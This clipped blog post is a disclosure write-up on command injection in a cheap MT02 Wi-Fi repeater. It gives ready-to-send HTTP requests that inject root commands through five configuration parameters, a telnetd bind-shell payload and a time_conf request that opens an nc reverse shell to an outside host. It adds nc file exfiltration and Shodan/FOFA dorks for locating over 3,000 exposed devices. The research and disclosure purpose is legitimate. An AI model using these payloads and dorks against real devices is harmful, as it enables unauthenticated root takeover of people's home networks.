---
title: When a Wi-Fi SSID Gives You Root on an MT02 Repeater – Part 2 - Chocapikk's Cybersecurity Blog
source: https://chocapikk.com/posts/2025/when-a-wifi-name-gives-you-root-part-two/
source_host: chocapikk.com
clip_date: 2026-09-24T10:27:24+08:00
trace_id: fae09d2a-93d4-477f-9cd4-573327bf7233
content_hash: de2723c4a471c092e8058c28c02afda104bb5c706b87729721c13362df4d248b
status: synced
tags:
  - 漏洞分析
  - 硬件逆向
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: €5 的 MT02 Wi-Fi 中继器因 UCI 配置参数拼接命令导致未认证 root RCE，作者最终用 `time_conf` 接口拿到不重启、不卡 Web 的稳定反向 shell。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3e575244-d011-81ad-9c4b-d842d2a53e24
ioc:
  cves:
    - CVE-2025-34147
    - CVE-2025-34148
    - CVE-2025-34149
    - CVE-2025-34150
    - CVE-2025-34151
    - CVE-2025-34152
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> €5 的 MT02 Wi-Fi 中继器因 UCI 配置参数拼接命令导致未认证 root RCE，作者最终用 `time_conf` 接口拿到不重启、不卡 Web 的稳定反向 shell。
> 
> - **初始入口：** 在扩展器设置页 SSID 字段注入 `$(id)`，重启后设备直接以 `uid=0(root)` 广播，证明未认证命令注入；FOFA/Shodan 用 `icon_hash="-741058468" && server=="lighttpd/1.4.32"` 搜出 3000+ 台暴露设备，多数无登录。
> - **四个阻碍：** 不知 CPU 架构与 shell（无 `/dev/tcp`）、SSID 仅约 32 字节无法回传输出、每次 UCI 提交后强制重启、`uhttpd` 单线程被 `while :; do :; done` 卡死后只能物理复位。
> - **可行载荷：** `telnetd -l /bin/sh -p 31338; while :; do :; done` 注入 `extap2g` 可获 root 绑定 shell（但 Web 仍被锁）；后续可 `nc` 外带 `/www/cgi-bin/luci`，确认固件为 MIPS32 大端 musl 程序 `commuos`、`masterCtrl`。
> - **注入面扩展：** 同一函数（`doSystemCmdComlib`）还处理 `ssid`、`key`、`user`、`passwd`，对应 CVE-2025-34147～34151；重启由 Comlib 的 reboot 操作码触发，注入代码在其之前以 root 执行。
> - **关键突破：** 未被调用的 `time_conf`（CVE-2025-34152）把 `time` 参数拼成 `date -s "<time>"` 执行，用 `fname=system&opt=time_conf&function=set&time=$(mkfifo /tmp/x; nc … | /bin/sh > /tmp/x 2>&1)` 即可无重启、无挂起地持久 RCE；已有 Metasploit 模块 `aitemi_m300_time_rce.rb`。

![When a Wi-Fi SSID Gives You Root on an MT02 Repeater – Part 2](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/cf2d05b8a25c3ff2.png)

## Introduction

### Contextual recap of the initial discovery

In early August 2025, I stumbled on a surprisingly easy bug in a €5 Shenzhen Aitemi M300 Wi-Fi Repeater (model MT02). While joking with friends over how cheap IoT devices must be full of holes, I typed `$(id)` into the SSID field on its Extender setup page. After a quick reboot, the repeater broadcasted `uid=0(root) gid=0(root)` as its network name, proof that an unauthenticated attacker could run commands as root. The simplicity of the test made a lot of people laugh, but it was only the start of a much deeper problem.

### Why a second part is necessary

At first glance, this bug looked like a funny stunt. Yet when I searched FOFA and Shodan, the real scope hit me:

-   **Shodan dork:** `http.favicon.hash:-741058468 "lighttpd/1.4.32"`
-   **FOFA dork:** `icon_hash="-741058468" && server=="lighttpd/1.4.32"`

![Fofa results](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f49910bcd9b161a3.png)

Fofa results

These searches returned over **3,000** repeaters exposed on the public Internet, most without any login at all. That means any attacker can reach the same Extender page and gain full root access, then pivot into the victim’s home network. What started as a prank quickly turned into a serious security issue, so I needed to dig deeper. Part 2 will cover the technical hurdles and real-world impact of turning this simple SSID trick into a stable, stealthy shell.

## Initial Technical Limitations

From the moment I moved past the `$(id)` proof-of-concept, I ran into a wall trying to turn it into a real shell. At first, I didn’t even know the device’s CPU or shell, was it MIPS, ARM, or something else? Every classic reverse-shell one-liner I tried either failed silently or printed syntax errors, because the built-in shell didn’t support `/dev/tcp`, or the syntax wasn’t right for that architecture. I assumed BusyBox was in use, but I had no way to confirm which utilities or flags were available without a working shell.

Since I couldn’t spawn a bind or reverse shell at all, my next idea was to exfiltrate command output via the SSID itself. The firmware runs whatever I inject into the `extap2g` field, then uses the result as the new network name. I tried things like `echo $PATH` or `ls /bin` so I could read the output as the repeater beaconed. But SSID names are capped at about 32 bytes; anything beyond that simply gets cut off. Chunking the output into many tiny SSID names would work only if I sat next to the repeater and watched each broadcast. A real attacker needs remote access, not a Wi-Fi stakeout.

On top of that, every time the captive-portal script applied our injected command, it immediately called a reboot. Even if a bind shell did start, the device would restart seconds later and kill my session. Wrapping the shell launch in an infinite loop (`while :; do :; done`) prevented the reboot, but since the embedded HTTP server is single-threaded, that loop hung the entire web interface. No further payloads could be sent, I had to press the tiny reset button to regain control.

In short, I was trapped by four forces at once: unknown architecture and shell behavior, SSID length limits for output exfil, zero knowledge of BusyBox utilities, and a forced reboot that wiped every session. Overcoming any one of these would be tough; solving all four meant rethinking the exploit from the ground up.

## Tested Payloads

My first attempts focused on simple tricks to stall or redirect execution. I injected an infinite loop into `extap2g`:

```bash
while :; do :; done
```

This proved the script runs my payload immediately, but it also froze the single-threaded HTTP server, so no further commands could be sent without physically resetting the device.

Next, I tried classic reverse shells (`/bin/sh -i >& /dev/tcp/...`) but they all failed. I didn’t know the CPU architecture (MIPS? ARM?) or which shell features were supported, so each one-liner died silently.

Because I couldn’t spawn a reverse shell, I shifted to a bind-shell approach. By wrapping `telnetd` in the loop…

```bash
telnetd -l /bin/sh -p 31338; while :; do :; done
```

… I could connect on port 31338 and drop into a root shell. This confirmed two things: commands execute **before** reboot, and the loop is needed to hold the shell alive.

However, each of these payloads revealed a key trade-off:

-   Infinite loops stop reboot but kill the web UI.
-   Reverse shells fail without architecture knowledge.
-   Telnetd + loop works once, but still locks the HTTP server.

These tests set the stage for finding a more reliable foothold.

## Bind Shell Deployment

The breakthrough came when I confirmed `/usr/sbin/telnetd` existed. Injecting:

```bash
$(telnetd -l /bin/sh -p 31338; while :; do :; done)
```

into the `extap2g` field gave me my first real foothold. As soon as the captive-portal script parsed that payload, a Telnet listener appeared on port 31338, and the infinite loop kept the process from rebooting.

Connecting from my machine:

```bash
telnet 192.168.11.208 31338
```

dropped me into a root shell.

![Bind shell using telnet](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/55fe24f4dfe387dc.png)

Bind shell using telnet

> **Note:** The following sections (Extracting, Inspecting, Dumping) contain forensic analysis details that aren’t essential to understanding the exploit. These sections document the device’s internals for researchers who want to analyze the firmware, but you can safely skip them if you’re only interested in the attack vector itself.

### Extracting /www/cgi-bin/luci

On my laptop:

```bash
nc -lvnp 9002 > luci
```

On the repeater’s shell:

```bash
nc 192.168.11.208 9002 < /www/cgi-bin/luci
```

```bash
$ file luci 
luci: Lua script, ASCII text executable
```

```lua
#!/usr/bin/lua
require "luci.cacheloader"
require "luci.sgi.cgi"
luci.dispatcher.indexcache = "/tmp/luci-indexcache"
luci.sgi.cgi.run()
```

```bash
/ # find / -name luci 2>/dev/null
/etc/config/luci
/overlay/upper/etc/config/luci
/rom/etc/config/luci
/rom/usr/lib/lua/luci
/rom/www/cgi-bin/luci
/tmp/.uci/luci
/usr/lib/lua/luci
/www/cgi-bin/luci
```

### Inspecting Processes

```bash
/webs # ps 
  PID USER       VSZ STAT COMMAND
    1 root      1528 S    /sbin/procd
...
  826 root      1712 S    /usr/sbin/commuos
  852 root      1196 S    /usr/sbin/telnetd -F -l /bin/login.sh
  874 root      1516 S    /usr/sbin/uhttpd -f -h /www -r Srepeater -x /cgi-bin -u /ubus -t 60 -T 30 -k
  898 root      1516 S    /usr/sbin/masterCtrl
...
 1343 root      1204 S    telnetd -l /bin/sh -p 31338
 32185 root      1204 S    /bin/sh
```

The full injected command:

```bash
sh -c uci set wireless.default_radio0.ssid="$(telnetd -l /bin/sh -p 31338;while :;do :;done)"
```

### Dumping /usr/sbin/commuos and /usr/sbin/masterCtrl

On the repeater:

```bash
/webs \# nc 192.168.11.208 9002 < /usr/sbin/commuos
/webs \# nc 192.168.11.208 9002 < /usr/sbin/masterCtrl
```

On my laptop:

```bash
nc -lvnp 9002 > commuos
Connection from 192.168.11.1:41484

nc -lvnp 9002 > masterCtrl
Connection from 192.168.11.1:41486
```

```bash
$ file commuos masterCtrl 
commuos:    ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mips-sf.so.1, no section header
masterCtrl: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-mips-sf.so.1, no section header
```

## Additional Injection Points

Beyond the `extap2g` field (**CVE-2025-34147**), the same vulnerable function processes several other parameters and calls `doSystemCmdComlib()` to apply UCI changes. Each of these can be abused in exactly the same way, by injecting shell code into the HTTP request body:

1.  **`extap2g`** (CVE-2025-34147)

```http
POST /protocol.csp? HTTP/1.1
Host: 192.168.11.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fname=net&opt=wisp_conf&function=set
&ssid=Safe&channel=6&security=WPA2PSK&enc=AES
&key=Kk123456!&bssid=AA:BB:CC:DD:EE:FF
&extap2g=INJECT_HERE
&extap2gkey=Kk123456!&hssid=0&enablebridge=0
```

2.  **`ssid`** (WISP SSID) (CVE-2025-34148)

```http
POST /protocol.csp? HTTP/1.1
Host: 192.168.11.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fname=net&opt=wisp_conf&function=set
&wanmode=1&ssid=INJECT_HERE&security=0
```

3.  **`key`** (WPA2-PSK password) (CVE-2025-34149)

```http
POST /protocol.csp? HTTP/1.1
Host: 192.168.11.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fname=net&opt=wisp_conf&function=set
&wanmode=1&ssid=Safe&security=1
&key=INJECT_HERE
```

4.  **`user`** (PPPoE username) (CVE-2025-34150)

```http
POST /protocol.csp? HTTP/1.1
Host: 192.168.11.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fname=net&opt=wisp_conf&function=set
&wanmode=2
&user=INJECT_HERE&passwd=AnyPass
&ssid=Safe&security=0
```

5.  **`passwd`** (PPPoE password) (CVE-2025-34151)

```http
POST /protocol.csp? HTTP/1.1
Host: 192.168.11.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fname=net&opt=wisp_conf&function=set
&wanmode=2&user=AnyUser
&passwd=INJECT_HERE
&ssid=Safe&security=0
```

All five parameters flow into the same internal function, which looks roughly like this in C:

```c
// --- Injection points in UndefinedFunction_0040d00c ---
char acStack_114[128];

// 1) default_wisp_radio0.ssid  (param "ssid")
char *ssid = FUN_004026f8(param_2, "ssid");
sprintf(acStack_114, "uci set wireless.default_wisp_radio0.ssid="%s"", ssid);
doSystemCmdComlib(acStack_114);

// 2) default_wisp_radio0.key   (param "key")
char *key = (char *)FUN_004026f8(param_2, "key");
sprintf(acStack_114, "uci set wireless.default_wisp_radio0.key=%s", key);
doSystemCmdComlib(acStack_114);

// 3) wan.username and wan.password    (param "user and passwd")
pcVar3: (char *)FUN_004026f8(param_2,"user");
pcVar6: (char *)FUN_004026f8(param_2,"passwd");

sprintf(acStack_4114,"uci set network.wan.username=%s",pcVar3);
doSystemCmdComlib(acStack_4114);
sprintf(acStack_4114,"uci set network.wan.password=%s",pcVar6);
doSystemCmdComlib(acStack_4114);

// 4) default_radio0.ssid       (param "extap2g")
char *extap2g = (char *)FUN_004026f8(param_2, "extap2g");
sprintf(acStack_114, "uci set wireless.default_radio0.ssid="%s"", extap2g);
doSystemCmdComlib(acStack_114);

// 5) encryption or key setting (dynamic format in pcVar3)
sprintf(acStack_114, pcVar3, key);
doSystemCmdComlib(acStack_114);
```

Each call to `doSystemCmdComlib()` runs the assembled UCI command through the device’s internal `sendMsgComlib()` mechanism. The actual reboot isn’t issued via a shell `reboot` command or by calling `/sbin/reboot`, it’s triggered by a dedicated Comlib message (`sendMsgComlib`) carrying a reboot opcode. After all UCI changes, that opcode fires, so any injected code executes as root before the device restarts.

## New Injection Primitive via time_conf (CVE-2025-34152)

By now it was clear that none of my earlier tricks met the three golden rules: no reboot, no HTTP hang, no lasting config changes. Wrapping commands in loops or killing processes only stalled the script in RAM, effectively “patching” the repeater until it was power-cycled. Worse, every UCI commit triggered a reboot, and freezing the single-threaded web server cut off my access for good. I needed a completely different primitive, one that ran code cleanly and returned control to the web interface.

Digging into the firmware, I finally spotted an unused function:

```c
undefined4 UndefinedFunction_00408278(undefined4 param_1,int param_2)
{
    int iVar1;
    undefined4 uVar2;
    char acStack_94 [128];
    int iStack_14;
    
    iStack_14: __stack_chk_guard;
    memset(acStack_94,0,0x80);
    iVar1: FUN_00402ce4(param_2);
    if (iVar1 == 0) {
        uVar2: 0x2712;
    }
    else {
        uVar2: FUN_004026f8(param_2,"time");
        sprintf(acStack_94,"date -s "%s"",uVar2);
        doSystemCmdComlib(acStack_94);
        uVar2: 0;
    }
    if (__stack_chk_guard != iStack_14) __stack_chk_fail();
    return uVar2;
}
```

This routine reads a `time` parameter, constructs a shell command `date -s "<time>"`, and sends it to the same `doSystemCmdComlib()` engine used by the UCI setters, yet it never commits any network config or schedules a reboot. It simply sets the system clock.

By guessing the obvious HTTP parameters (`fname=system`, `opt=time_conf`, `function=set`, `time=<payload>`), I could invoke this function directly, running arbitrary shell code without rebooting or freezing `uhttpd`. Here’s the full PoC request:

```http
POST /protocol.csp? HTTP/1.1
Host: 192.168.11.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 170
Origin: http://192.168.11.1
Connection: keep-alive
Referer: http://192.168.11.1/network.html
Priority: u=0

fname=system&opt=time_conf&function=set&time=$(mkfifo /tmp/x; nc 192.168.11.208 4444 < /tmp/x | /bin/sh > /tmp/x 2>&1)
```

Once sent, the repeater simply ran my `date -s ...` payload under the hood, returned to the web interface normally (no reboot, no hang), and waited for the next request. This finally checked all three boxes: I could execute code as root, preserve the HTTP server’s availability, and leave the extender’s configuration untouched, giving me a persistent, stealthy RCE without ever touching the reset button.

![Reliable Reverse Shell](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/4c8c816feee8e8e9.png)

Reliable Reverse Shell

## Exploitation Tools

For those interested in further technical exploration, a Metasploit module is available to exploit the `time_conf` vulnerability (CVE-2025-34152):

-   **Metasploit Module**: Available at [`modules/exploits/linux/http/aitemi_m300_time_rce.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/aitemi_m300_time_rce.rb), provides an automated way to exploit the vulnerability within a framework familiar to security professionals.

## Conclusion

What started as a simple SSID injection bug evolved into a full root compromise chain. The initial `$(id)` proof-of-concept revealed a critical command injection vulnerability, but turning it into a reliable exploit required overcoming multiple technical hurdles: architecture-specific shell limitations, SSID length constraints, forced reboots, and single-threaded HTTP server behavior.

The breakthrough came from discovering the `time_conf` primitive—a function that executes shell commands without triggering network configuration commits or system reboots. This finding demonstrates the importance of deep firmware analysis when developing exploits, as the most reliable attack vectors often lie in unexpected code paths.

For IoT device manufacturers, this case highlights the risks of trusting user-controlled input in privileged contexts. Even seemingly harmless configuration fields can become attack surfaces when proper input validation and output encoding are missing. The combination of unauthenticated access, command injection, and root privileges creates a perfect storm for attackers seeking persistent access to network infrastructure.

As for defenders, this research underscores the need for comprehensive security testing of embedded devices, especially those handling network configuration. Simple black-box testing might miss subtle vulnerabilities that only emerge through firmware analysis and reverse engineering.
